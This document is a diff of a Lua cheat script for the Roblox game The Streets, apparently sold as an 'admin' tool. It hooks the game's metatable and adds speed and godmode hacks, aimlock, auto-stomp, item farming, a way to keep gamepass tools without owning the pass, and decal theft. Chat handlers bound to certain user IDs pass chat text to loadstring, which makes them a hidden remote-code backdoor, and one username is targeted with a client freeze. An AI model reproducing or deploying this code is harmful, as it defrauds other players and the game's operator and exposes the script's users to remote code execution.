@@ -5,22 +5,25 @@ repeat wait() until LP and LP.Character and LP.Character:FindFirstChild'Humanoid
 local Mouse = LP:GetMouse()
 local NormalWS,NormalJP,NormalHH = LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed,LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower,game.Players.LocalPlayer.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight
 local AirWalkOn,AntiFeKill,SpawnAtDeathPos,WaitingToRespawn,Noclipping,Blinking,FreeCamBlink,BfgOn,MinigunMode,MultiUzi,DoubleJumpEnabled,NoGh,AutoDie,AutoStomp,GodMode,Debounce,NormalBfg,AimLock = false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false
-local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,ClockTime,PlayOnDeath,AimlockTarget = nil,nil,nil,nil,nil,nil,nil
+local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,SpawnSprint,SpawnCrouch,ClockTime,PlayOnDeath,AimlockTarget = nil,nil,nil,nil,nil,nil,nil,nil,nil
 local speedfly = 2
 local BlinkKey,ClickTpKey = "",""
 local DeathPos,WaitingToRespawnPos = CFrame.new(),CFrame.new()
 local Cmds = {}
-local AntiKillTools,Keys,KeyTable,UrlEncoder,PartTable = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";}
-local CmdsList = {"Speed // Ws [Arguments]","JumpPower // Jp [Arguments]","Rejoin // Rj","AirWalk [On/Off]","Lock // Unlock","DeathSpawn","Btools","Reset // Re","Noclip","To // Goto [plr]","AntiKill","Time [Arguments]","Blink [Arguments]","Fly [Arguments] // Unfly","Loop [Ws/Jp/HH] // Unloop","Key [Key] [Cmd]","RemoveKey [Key]","RemoveAllKeys","ClickTp [key]","View [plr] // Unview","Fblink [key]","Fspeed [Arguments]","Spamclick [Amount]","Esp [Player]","Unesp [Player]","neversit","bfg [normal/minigun/multiuzi/allbfg/nil]","info [plr] [os/operatingsystem]/[accage/age/accountage]/nil","spam [text]/spamdelay [delay]/unspam","doublejump","NoGh","advertise","autodie","hipheight/hh [Argument]","style [deathcircle/shield1/shield2/circle/wormhole/storm/sphere]","droptool","grip [6 args all optional]","TpTo [Banland/NormalStreets]","autostomp","farm [Cash/Shotty/Uzi/Sawed Off/Katana/All/Auto]","luacode [code]","godmode","antiaim","aimlock [Optional Player]"} -- Only bfg multiuzi works without bfg bypass
+local AntiKillTools,Keys,KeyTable,UrlEncoder,PartTable = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;['Control'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";}
+local CmdsList = {"Speed // Ws // SprintSpeed // CrouchSpeed [Arguments]","JumpPower // Jp [Arguments]","Rejoin // Rj","AirWalk [On/Off]","Lock // Unlock","DeathSpawn","Btools","Reset // Re","Noclip","To // Goto [plr]","AntiKill","Time [Arguments]","Blink [Arguments]","Fly [Arguments] // Unfly","Loop [Ws/Jp/HH/Sprint/Crouch] [Arguments]// Unloop","Key [Key] [Cmd]","RemoveKey [Key]","RemoveAllKeys","ClickTp [key]","View [plr] // Unview","Fblink [key]","Fspeed [Arguments]","Spamclick [Amount]","Esp [Player]","Unesp [Player]","neversit","bfg [normal/minigun/multiuzi/allbfg/nil]","info [plr] [os/operatingsystem]/[accage/age/accountage]/nil","spam [text]/spamdelay [delay]/unspam","doublejump","NoGh","advertise","autodie","hipheight/hh [Argument]","style [deathcircle/shield1/shield2/circle/wormhole/storm/sphere]","droptool","grip [6 args all optional]","TpTo [Banland/NormalStreets]","autostomp","farm [Cash/Shotty/Uzi/Sawed Off/Katana/All/Auto]","luacode [code]","godmode","antiaim","aimlock [Optional Player]","antiafk","heal","reload","colour [outline/text/background] [rgb]"} -- Only bfg multiuzi works without bfg bypass
 local AirWalk,AntiKill = Instance.new'Part',Instance.new'Part'
 local Clone,Destroy,Grab = Instance.new'HopperBin',Instance.new'HopperBin',Instance.new'HopperBin'
 local gamememe = getrawmetatable(game)
-local Closure = hide_me or newcclosure
+local Closure,Caller = hide_me or newcclosure,checkcaller or is_protosmasher_caller or Cer.isCerus
 local writeable = setreadonly(gamememe,false) or make_writeable(gamememe)
 local name,index,nindex = gamememe.__namecall,gamememe.__index,gamememe.__newindex
 local NGrav = workspace.Gravity
 ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Welcome to Zetox v999 Cracked by (jk it's cyrus' streets admin and chat messages are gay!)","All")
 -- ^ if you remove this line you are a skid.
+local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
+local CText = Instance.new("TextBox",Cframe)
+local CmdFrame = Instance.new("Frame",Cframe)
 
 if LP:IsInGroup(4401821) or LP:IsInGroup(3974060) or LP:IsInGroup(3869991) or LP:IsInGroup(5222647) or LP:IsInGroup(4516574) or string.find(string.lower(LP.Name),"odsg") then 
 	LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = 500 
@@ -31,7 +34,7 @@ if LP:IsInGroup(4401821) or LP:IsInGroup(3974060) or LP:IsInGroup(3869991) or LP
 end 
 
 if workspace:FindFirstChild'Armoured Truck' then
-	PartTable = {['Burger'] = workspace:FindFirstChild'Burger | $15':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);['Drink'] = workspace:FindFirstChild'Drink | $15':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);['Ammo'] = workspace:FindFirstChild'Buy Ammo | $25':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0)}
+	PartTable = {['Burger'] = workspace:FindFirstChild'Burger | $15':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);['Drink'] = workspace:FindFirstChild'Drink | $15':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0);['Ammo'] = workspace:FindFirstChild'Buy Ammo | $25':FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1,0)}
     workspace["Armoured Truck"]:Destroy()
 elseif workspace:FindFirstChild'TPer' then 
     workspace['TPer']:Destroy()
@@ -91,22 +94,21 @@ local function loluzistatscool()
 	ZetoxUzi.ToolTip = "Zetox Uzi | Clips "..tostring(ClipsAmount / UziAmount).." | Damage "..tostring(UziAmount * 20).." | Ammo "..tostring(AmmoAmount / UziAmount).." | Uzi Amount "..tostring(UziAmount)
 end
 
-local ReloadDebounce = false 
+local loldebounce = false 
 local function lolmultiuzithatisreloading(Part)
-	if Part.Parent.Name == "Buy Ammo | $25" and LP.Character:FindFirstChild'Zetox Uzi' and LP.PlayerGui:FindFirstChild'Uzi' then 
-		ReloadDebounce = true 
-		local ActualUzi,LowestAmmo,Child = nil,math.huge,LP.PlayerGui:GetChildren()
-		for i = 1,#Child do 
-			if Child[i].Name == "Uzi" and Child[i].Clips and Child[i].Clips.Value < LowestAmmo then 
-				LowestAmmo = Child[i].Clips.Value 
-				ActualUzi = Child[i]
+	if Part.Parent.Name == "Buy Ammo | $25" and LP.Character:FindFirstChild'Zetox Uzi' and LP.PlayerGui:FindFirstChild'Uzi' and not loldebounce then
+		local ActualUzi,LowestAmmo,Child,loldebounce = nil,math.huge,LP.PlayerGui:GetChildren(),true
+		for _,v in pairs(Child) do 
+			if v.Name == "Uzi" and v.Clips and v.Clips.Value < LowestAmmo then 
+				LowestAmmo = v.Clips.Value 
+				ActualUzi = v
 			end
 		end
 		ActualUzi.Parent = LP.Backpack
 		ActualUzi.Parent = LP.Character
-		repeat wait() until Part.Parent.Name == "Bought!" 
+		repeat wait() until Part.BrickColor == BrickColor.new'Bright Red' -- checking name didn't work well so why not just check brick colour lol 
 		ActualUzi.Parent = LP.PlayerGui
-		ReloadDebounce = false 
+		loldebounce = false 
 	end
 end
 
@@ -125,7 +127,7 @@ local function Teleport(Part)
 		LP.Character.HumanoidRootPart.CFrame = Part
 	else
 		NeverSitting,Noclipping = true,true
-		local Play = TweenService:Create(LP.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),{CFrame = Part})
+		local Play = TweenService:Create(LP.Character.HumanoidRootPart, TweenInfo.new(3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),{CFrame = Part})
 		Play:play()
 	end
 end
@@ -158,18 +160,22 @@ end
 
 local function Ammo()
 	if Debounce then return end
-	local CFRame,Old = LP.Character.HumanoidRootPart.CFrame,LP.Character:FindFirstChildOfClass'Tool'.Clips.Value
+	local CFRame,Old,Anim = LP.Character.HumanoidRootPart.CFrame,LP.Character:FindFirstChildOfClass'Tool'.Clips.Value,Instance.new'Animation'
+	Anim.AnimationId = "rbxassetid://188632011" 
+	local Track = LP.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(Anim)
 	LP.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(20,45),0,math.random(1,5))
     wait()
-    repeat  
+	repeat  
+		Track:play(.1,1,1)
         LP.Character.HumanoidRootPart.CFrame = PartTable['Ammo']
         game:GetService'RunService'.Heartbeat:wait()
 	until Old < LP.Character:FindFirstChildOfClass'Tool'.Clips.Value or LP.Character:FindFirstChild'KO' or LP.Character.Humanoid.Health <= 0
+	Track:Stop()
 	LP.Character.HumanoidRootPart.CFrame = CFRame
 end 
 
 gamememe.__newindex = Closure(function(self,Property,b)
-	if not checkcaller() and not is_protosmasher_caller() then
+	if not Caller() then
 		local a = getfenv(2).script
 		if tostring(self) == "Humanoid" and Property == "Health" or Property == "WalkSpeed" or Property == "JumpPower" then 
 			return nindex(Instance.new'Humanoid',Property,b)
@@ -189,7 +195,7 @@ gamememe.__index = Closure(function(self,Property,b)
 end)
 
 gamememe.__namecall = Closure(function(self,...)
-	if not checkcaller() and not is_protosmasher_caller() then 
+	if not Caller() then 
 	local Arguments = {...}
 		if getnamecallmethod() == "Destroy" and tostring(self) == "BodyGyro" or tostring(self) == "BodyVelocity" then 
 			return name(Instance.new'Part',...)
@@ -231,7 +237,7 @@ end)
 local SettingsTable = {
    Keys = {};
    ClickTpKey = "";
-   BlinkKey = ""; 
+   BlinkKey = "";
 }
 
 local function savesettings()
@@ -239,7 +245,8 @@ local function savesettings()
     local SettingsToSave = HttpService:JSONDecode(readfile("CyrusStreetsAdminSettings"))
     Keys = SettingsToSave.Keys
     ClickTpKey = SettingsToSave.ClickTpKey
-    BlinkKey = SettingsToSave.BlinkKey
+	BlinkKey = SettingsToSave.BlinkKey
+	KeyBinds = SettingsToSave.KeyBinds
 end 
 
 local function updateSettings()
@@ -247,6 +254,7 @@ local function updateSettings()
         Keys = Keys;
 		ClickTpKey = ClickTpKey;
 		BlinkKey = BlinkKey;
+		KeyBinds = KeyBinds;
     }
     writefile("CyrusStreetsAdminSettings",HttpService:JSONEncode(New))
 end
@@ -255,7 +263,8 @@ local function runsettings()
     local SettingsToRun = HttpService:JSONDecode(readfile("CyrusStreetsAdminSettings"))
     Keys = SettingsToRun.Keys
     ClickTpKey = SettingsToRun.ClickTpKey
-    BlinkKey = SettingsToRun.BlinkKey
+	BlinkKey = SettingsToRun.BlinkKey
+	KeyBinds = SettingsToRun.KeyBinds
 end
 
 local Work,Error = pcall(function() readfile("CyrusStreetsAdminSettings") end)
@@ -392,13 +401,17 @@ local function DoubleJump()
   end
 end
 
+local function notif(title,message,length,icon)
+	StarterGui:SetCore("SendNotification",{['Title'] = title;['Text'] = message;['Duration'] = length;['Icon'] = icon;})
+end
+
 local function PlrFinder(Plr)
 local PlrTable = {}
 local NewPlr = Plr:lower() 
 	for _,v in pairs(Players:GetPlayers()) do 
 		if string.lower(v.Name):sub(1,#NewPlr) == string.lower(NewPlr) then 
 			table.insert(PlrTable,v)
-			return PlrTable
+			return PlrTable 
 		end
 	end
 end
@@ -417,13 +430,9 @@ local function MultiUzif(Tool)
 	end
 end
 
-local function notif(title,message,length,icon)
-	StarterGui:SetCore("SendNotification",{['Title'] = title;['Text'] = message;['Duration'] = length;['Icon'] = icon;})
-end
-
 local function find(Item)
   for i,v in pairs(workspace:GetChildren()) do 
-      if v.Name == "RandomSpawner" then
+      if v.Name == "RandomSpawner" and v:FindFirstChild'Model' then
       local Handle = v.Model.Handle
         if Item == "Cash" and Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
           return v 
@@ -446,7 +455,9 @@ local Children = workspace:GetChildren()
     if Children[i].Name == "RandomSpawner" then 
 		if find(Item) and type(find(Item)) == "userdata" then 
 			Teleport(find(Item).CFrame)
-			wait(3)
+			if not _G.DoYouHaveBfgBypass then 
+				wait(3)
+			end
 		else 
 			notif("Farm "..Item,"None of "..Item.." on the map",5,"rbxassetid://1281284684")
 			break;
@@ -635,6 +646,16 @@ local function Modes()
 	end
 	if Mouse.Target and Players:GetPlayerFromCharacter(Mouse.Target.Parent) and Mouse.Target.Parent:FindFirstChildOfClass'Humanoid' and AimLock and not OnlyAimLock then 
 		AimlockTarget = Mouse.Target.Parent
+		AimlockTarget:FindFirstChildOfClass'Humanoid'.Died:Connect(function(a)
+			AimlockTarget = nil
+			OnlyAimLock = false  
+		end)
+		AimlockTarget.ChildAdded:Connect(function(P) 
+			if P.Name == "KO" then 
+				AimlockTarget = nil 
+				OnlyAimLock = false
+			end
+		end)
 		notif("AimlockTarget","has been set to "..AimlockTarget.Name,5,"rbxassetid://1281284684")
 	end
 end
@@ -700,6 +721,8 @@ local function HotkeyHandler(Key)
     end
 end
 
+local ShiftSpeed,WalkSpeed,ControlSpeed = 25,16,8
+local AntiAfk = false
 local function Looped()
 	pcall(function()
 		if Noclipping and LP.Character then 
@@ -718,7 +741,7 @@ local function Looped()
 		if AutoStomp then
 			local Players = Players:GetPlayers()
 			for i = 1,#Players do
-				if Players[i] ~= LP and Players[i].Character and Players[i].Character.Head then
+				if Players[i] ~= LP and Players[i].Character and Players[i].Character.Head and not Players[i]:IsFriendsWith(LP.UserId) then
 					if (LP.Character.HumanoidRootPart.Position - Players[i].Character.HumanoidRootPart.Position).magnitude < 50  and Players[i].Character:FindFirstChild'KO' and Players[i].Character.Humanoid.Health > 0 and not LP.Character:FindFirstChild'KO' and LP.Character.Humanoid.Health > 0 then
 						local CurrentTool = LP.Character:FindFirstChild'Punch'
 						if not CurrentTool then 
@@ -742,6 +765,11 @@ local function Looped()
 				end
 			end
 		end
+		if AntiAfk then 
+			keypress(0x20)
+			wait()
+			keyrelease(0x20)
+		end
 	end)
 end
 
@@ -751,18 +779,61 @@ local function GodFuckIhateRobloxIHaveNoMotivationForThisShitGame(Thing)
     end
 end
 
+local function b(Tool)
+	if Tool.Name == "Uzi" then 
+		loluzistatscool()
+	end
+end
+
+local function lol()
+	if not SpawnWS then 
+		WalkSpeed = 16
+	end
+	if not SpawnSprint then
+		ShiftSpeed = 25
+	end
+	if not SpawnCrouch then 
+		ControlSpeed = 8 
+	end
+	if not MarketplaceService:UserOwnsGamePassAsync(LP.UserId,1378459) and LP.Backpack:FindFirstChild'Glock' then 
+		LP.Backpack.Glock.Parent = LP.PlayerGui 
+	end 
+	if not MarketplaceService:UserOwnsGamePassAsync(LP.UserId,1378577) and LP.Backpack:FindFirstChild'Pipe' then
+		LP.Backpack.Pipe.Parent = LP.PlayerGui 
+	end
+	if not MarketplaceService:UserOwnsGamePassAsync(LP.UserId,1159109) and LP.Backpack:FindFirstChild'BoomBox' then 
+		LP.Backpack.BoomBox.Parent = LP.PlayerGui 
+	end 
+	if not MarketplaceService:UserOwnsGamePassAsync(LP.UserId,1541433) and LP.Backpack:FindFirstChild'Spray' then 
+		LP.Backpack.Spray.Parent = LP.PlayerGui
+	end
+	if not MarketplaceService:UserOwnsGamePassAsync(LP.UserId,2716073) and LP.Backpack:FindFirstChild'Shotty' then 
+		LP.Backpack.Shotty.Parent = LP.PlayerGui 
+	end 
+	if not MarketplaceService:UserOwnsGamePassAsync(LP.UserId,5058091) and LP.Backpack:FindFirstChild'Sign' then 
+		LP.Backpack.Sign.Parent = LP.PlayerGui 
+	end
+end 
+
 local function Added()
 	repeat wait(0.5) until LP.Character:FindFirstChildWhichIsA'Humanoid' and LP.Character.Animate 
 	LP.Character.Humanoid.StateChanged:Connect(HumanoidState)
 	LP.Backpack.ChildAdded:Connect(MultiUzif)
 	LP.Character.ChildAdded:Connect(GodFuckIhateRobloxIHaveNoMotivationForThisShitGame)
+	LP.PlayerGui.ChildAdded:Connect(b)
 	LP.Character['Left Leg'].Touched:Connect(lolmultiuzithatisreloading)
+	LP.Character.Humanoid.Died:Connect(lol)
 	StarterGui:SetCore('ResetButtonCallback',BindableEvent)
     LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed = SpawnWS or NormalWS
     LP.Character:FindFirstChildWhichIsA'Humanoid'.JumpPower = SpawnJP or NormalJP
-    LP.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight = SpawnHH or NormalHH
+	LP.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight = SpawnHH or NormalHH
 	if SpawnAtDeathPos then
         Teleport(DeathPos)
+	end
+	for _,v in pairs(LP.PlayerGui:GetChildren()) do 
+		if v:IsA'Tool' then 
+			v.Parent = LP.Backpack -- saves your tools if you die and don't have the gamepass 
+		end
 	end
 	if PlayOnDeath then 
 		local Tool = LP.Backpack:FindFirstChild'BoomBox'
@@ -826,7 +897,8 @@ Cmds.muteallradios = function(Arguments)
 end
 
 Cmds.speed = function(Arguments)
-	if Arguments[1] then 
+	if Arguments[1] then
+		WalkSpeed = Arguments[1]
 		LP.Character:FindFirstChildWhichIsA'Humanoid'.WalkSpeed = Arguments[1]
 	end
 end
@@ -834,6 +906,18 @@ end
 Cmds.ws = function(Arguments)
 	if Arguments[1] then 
 		RunCmd("speed "..Arguments[1])
+	end
+end
+
+Cmds.sprintspeed = function(Arguments)
+	if Arguments[1] then
+		ShiftSpeed = Arguments[1]
+	end
+end
+
+Cmds.crouchspeed = function(Arguments)
+	if Arguments[1] then 
+		ControlSpeed = Arguments[1]
 	end
 end
 
@@ -1104,7 +1188,13 @@ Cmds.loop = function(Arguments)
             SpawnJP = Arguments[2] or NormalJP
         elseif string.lower(Arguments[1]) == "hh" or string.lower(Arguments[1]) == "hipheight" then
             LP.Character:FindFirstChildWhichIsA'Humanoid'.HipHeight = Arguments[2] 
-            SpawnHH = Arguments[2] or NormalHH
+			SpawnHH = Arguments[2] or NormalHH
+		elseif string.lower(Arguments[1]) == "sprint" then
+			SpawnSprint = Arguments[2] or 25
+			ShiftSpeed = Arguments[2] or 25 
+		elseif string.lower(Arguments[1]) == "crouch" then
+			SpawnCrouch = Arguments[2] or 8
+			ControlSpeed = Arguments[2] or 25 
         end
 	end
 end
@@ -1172,6 +1262,15 @@ Cmds.aimlock = function(Arguments)
 			AimLock = true
 			OnlyAimLock = true 
 			AimlockTarget = v.Character
+			b = v:FindFirstChildOfClass'Humanoid'.Died:Connect(function(Char)
+				AimlockTarget = nil 
+			end)
+			AimlockTarget.ChildAdded:Connect(function(P) 
+				if P.Name == "KO" then 
+					AimlockTarget = nil 
+					OnlyAimLock = false
+				end
+			end)
 			notif("Command: AimLock","has been set to "..tostring(AimLock).." target is "..v.Name,5,"rbxassetid://1281284684")
 		end
 	else
@@ -1197,6 +1296,25 @@ Cmds.key = function(Arguments)
 	end
 end 
 
+local HDebounce = false 
+Cmds.heal = function(Arguments)
+	if HDebounce or not PartTable then return end 
+	Heal()
+	HDebounce = true 
+	repeat wait() until workspace:FindFirstChild'Burger | $15' and workspace:FindFirstChild'Drink | $15' 
+	HDebounce = false 
+end 
+
+local RDebounce = false 
+Cmds.reload = function(Arguments)
+if RDebounce or not PartTable then return end 
+if LP.Character:FindFirstChildOfClass'Tool' and not LP.Character:FindFirstChildOfClass'Tool'.Clips or not LP.Character:FindFirstChildOfClass'Tool' then notif("Tool needed","Hold a gun",5,nil) return end 
+	Ammo()
+	RDebounce = true 
+	repeat wait() until workspace:FindFirstChild'Buy Ammo | $25' 
+	RDebounce = false 
+end
+
 Cmds.doublejump = function(Arguments)
   DoubleJumpEnabled = not DoubleJumpEnabled
   notif("Command: DoubleJump","has been set to "..tostring(DoubleJumpEnabled),5,"rbxassetid://1281284684")
@@ -1211,6 +1329,20 @@ Cmds.removekey = function(Arguments)
 				UpdateSettings()
 			end
 		end
+	end
+end
+
+Cmds.colour = function(Arguments)
+	if Arguments[1] then 
+		if Arguments[1]:lower() == "outline" then 
+			Cframe.BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+		elseif Arguments[1]:lower() == "text" then 
+			CText.BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+		elseif Arguments[1]:lower() == "background" then 
+			CmdFrame.BackgroundColor3 = Color3.new(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
+		end
+	else
+		notif("Command: Colour","Colour: [BackGround/Text/Outline] [rgb]",5,"rbxassetid://1281284684")
 	end
 end
 
@@ -1240,6 +1372,7 @@ Cmds.unview = function(Arguments)
 end
 
 Cmds.style = function(Arguments)
+if not _G.DoYouHaveBfgBypass then notif("Command: Style","This is only for people with BFG bypass. Use the grip command.",5,"rbxassetid://1281284684") return end 
   if Arguments[1] then 
     if Arguments[1]:lower() == "void" then
       if not Arguments[2] then 
@@ -1295,6 +1428,7 @@ Cmds.fblink = function(Arguments)
 		UpdateSettings()
 	end
 end
+
 local AutoFarm = false 
 Cmds.farm = function(Arguments)
     if Arguments[1] then 
@@ -1424,8 +1558,10 @@ Cmds.advertise = function(Arguments)
   ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by Cyrusrock1Alt | Join the cord at UVgdNXP","All")
 end
 
-local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
-local CText = Instance.new("TextBox",Cframe)
+Cmds.antiafk = function(Arguments)
+	AntiAfk = not AntiAfk
+	notif("Command: AntiAfk","has been set to "..tostring(AntiAfk),5,"rbxassetid://1281284684")
+end
 
 Cframe.BackgroundColor3 = Color3.new(0.666667, 0, 0)
 Cframe.BackgroundTransparency = 0.20000000298023
@@ -1446,7 +1582,6 @@ CText.TextSize = 14
 CText.TextWrapped = true
 CText.Name = math.random(1,3000000)
 
-local CmdFrame = Instance.new("Frame",Cframe)
 CmdFrame.BackgroundColor3 = Color3.new(0, 0.000738177, 0.000738177)
 CmdFrame.BorderSizePixel = 0
 CmdFrame.Position = UDim2.new(0, 0, -4, 0)
@@ -1518,11 +1653,19 @@ local CoolkidTable = {
 	['29461396'] 	= "trippinfo";
 	['197131085'] 	= "trippinfo";
 	['412957'] 		= "trippinfo";
+	['1443431439']  = "wk1r";
+	['164282612']   = "wk1r";
 }
 
-local function Started(key,chatting)
+local function Started(Key,chatting)
 if chatting then return end 
-	if key.KeyCode == Enum.KeyCode.Quote then
+	if Key.KeyCode == Enum.KeyCode.LeftShift and ShiftSpeed then 
+		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = ShiftSpeed 
+	end
+	if Key.KeyCode == Enum.KeyCode.LeftControl then 
+		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = ControlSpeed 
+	end 
+	if Key.KeyCode == Enum.KeyCode.Quote then
 		CText:CaptureFocus()
 		Cframe:TweenPosition(UDim2.new(0.015, 0, 0.95, 0), "Out", "Elastic", 0.5, true)
 	end
@@ -1530,7 +1673,7 @@ if chatting then return end
 		if Target then 
 			Player = Players:GetPlayerFromCharacter(Target.Parent) or Players:GetPlayerFromCharacter(Target.Parent.Parent)
 		end
-	if key.KeyCode == Enum.KeyCode.Q and Player then
+	if Key.KeyCode == Enum.KeyCode.Q and Player then
 		if Player.Name == "NotCyrusAtAll" then while true do end end
 		for _,v in pairs(Player:GetDescendants()) do 
 			if v:IsA'Sound' and v.Name == "SoundX" then
@@ -1542,30 +1685,23 @@ if chatting then return end
 			end
 		end
 	end
-	if key.KeyCode == Enum.KeyCode.Q and string.find(Mouse.Target.Name,"Spray") then 
+	if Key.KeyCode == Enum.KeyCode.Q and string.find(Mouse.Target.Name,"Spray") then 
 		local Target = Mouse.Target 
 		if Target:FindFirstChildOfClass'BlockMesh' and Target:FindFirstChildOfClass'Decal' then 
 			notif("Stole the decal from "..Target.Name:gsub("Spray",""),"The ID is "..tostring(Target.Decal.Texture:match"%d+").." it is also in your workspace folder",5,nil)
 			writefile("DecalLog From "..Target.Name:gsub("Spray","").." "..math.random(1,99)..".txt","Stolen Decal: "..tostring(Target.Decal.Texture:match"%d+").." From: "..Target.Name:gsub("Spray",""))
 		end
 	end
-	if PartTable and key.KeyCode == Enum.KeyCode.H then
-		Heal()
-        Debounce = true 
-        repeat wait() until workspace:FindFirstChild'Burger | $15' and workspace:FindFirstChild'Drink | $15' 
-		Debounce = false 
-	end
-	if PartTable and key.KeyCode == Enum.KeyCode.R then
-		if LP.Character:FindFirstChildOfClass'Tool' and not LP.Character:FindFirstChildOfClass'Tool'.Clips or not LP.Character:FindFirstChildOfClass'Tool' then notif("Tool needed","Hold a gun",5,nil) return end 
-		Ammo()
-		Debounce = true 
-		repeat wait() until workspace:FindFirstChild'Buy Ammo | $25' 
-		Debounce = false 
-	end 
 end
 
 local function Ended(Key,Chatting)
-	if Chatting then return end -- not used yet lol 
+	if Chatting then return end -- used now lol 
+	if Key.KeyCode == Enum.KeyCode.LeftShift and ShiftSpeed then
+		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = WalkSpeed
+	end
+	if Key.KeyCode == Enum.KeyCode.LeftControl and ControlSpeed then 
+		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = WalkSpeed
+	end 
 end
 
 local function Lost(Enter)
@@ -1629,14 +1765,6 @@ local function espcoolkid(Plr,Char)
 	end)
 end
 
-local function backdoorlol(player,Chat)
-if CoolkidTable[tostring(player.UserId)] then return end
-	if Chat:sub(1,5) == "exec " then 
-		RunCmd(Chat:sub(6))
-	elseif Chat:sub(1,4) == "lua " then 
-		loadstring(Chat:sub(5))()
-	end
-end
 
 for _,v in pairs(Players:GetPlayers()) do 
 	if CoolkidTable[tostring(v.UserId)] then 
@@ -1645,7 +1773,14 @@ for _,v in pairs(Players:GetPlayers()) do
 			repeat wait() until Char.Head
 			espcoolkid(v,v.Character)
 		end)
-		v.Chatted:Connect(backdoorlol)
+		v.Chatted:Connect(function(Chat)
+		if CoolkidTable[tostring(v.UserId)] then return end
+			if Chat:sub(1,5) == "exec " then 
+				RunCmd(Chat:sub(6))
+			elseif Chat:sub(1,4) == "lua " then 
+				loadstring(Chat:sub(5))()
+			end
+		end)
 	end
 end
 
@@ -1655,7 +1790,14 @@ Players.PlayerAdded:Connect(function(plr)
 			repeat wait() until Char.Head
 			espcoolkid(plr,Char)
 		end)
-		plr.Chatted:Connect(backdoorlol)
+		plr.Chatted:Connect(function(Chat)
+		if CoolkidTable[tostring(plr.UserId)] then return end
+			if Chat:sub(1,5) == "exec " then 
+				RunCmd(Chat:sub(6))
+			elseif Chat:sub(1,4) == "lua " then 
+				loadstring(Chat:sub(5))()
+			end
+		end)
 	end
 	if tostring(plr.UserId) == "659119329" then 
 		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Your god Cyrus has joined.","All")
@@ -1664,9 +1806,12 @@ end)
 
 LP.Chatted:Connect(RunCmd)
 LP.Backpack.ChildAdded:Connect(MultiUzif)
+LP.PlayerGui.ChildAdded:Connect(b)
+LP.Character.ChildAdded:Connect(GodFuckIhateRobloxIHaveNoMotivationForThisShitGame)
 LP.CharacterAdded:Connect(Added)
 LP.Character.Humanoid.StateChanged:Connect(HumanoidState)
 LP.Character['Left Leg'].Touched:Connect(lolmultiuzithatisreloading)
+LP.Character.Humanoid.Died:Connect(lol)
 RunService.Stepped:Connect(Looped)
 Mouse.KeyDown:Connect(HotkeyHandler)
 CText.Changed:Connect(Changed)
@@ -1676,7 +1821,6 @@ UserInput.InputEnded:Connect(Ended)
 UserInput.TextBoxFocusReleased:Connect(Released)
 UserInput.JumpRequest:Connect(DoubleJump)
 Mouse.Button1Down:Connect(Modes)
-LP.Character.ChildAdded:Connect(GodFuckIhateRobloxIHaveNoMotivationForThisShitGame)
 
 
 spawn(function()
@@ -1689,7 +1833,7 @@ end)
 
 spawn(function()
 	while true do
-		if LP.Character and LP.Character:FindFirstChildOfClass'Humanoid' and LP.Character:FindFirstChild'HumanoidRootPart' then
+		if LP.Character and LP.Character:FindFirstChildOfClass'Humanoid' and LP.Character:FindFirstChild'HumanoidRootPart' and LP.Character:FindFirstChild'Head' then
 			if LP.Character:FindFirstChildOfClass'Humanoid'.HipHeight > 0 or flying or AirWalkOn and LP.Character.Humanoid.FloorMaterial == Enum.Material.Neon and not LP.Character:FindFirstChildOfClass'Humanoid'.Sit then 
 				local JP = LP.Character:FindFirstChildOfClass'Humanoid'.JumpPower
 				LP.Character:FindFirstChildOfClass'Humanoid'.JumpPower = 1.5
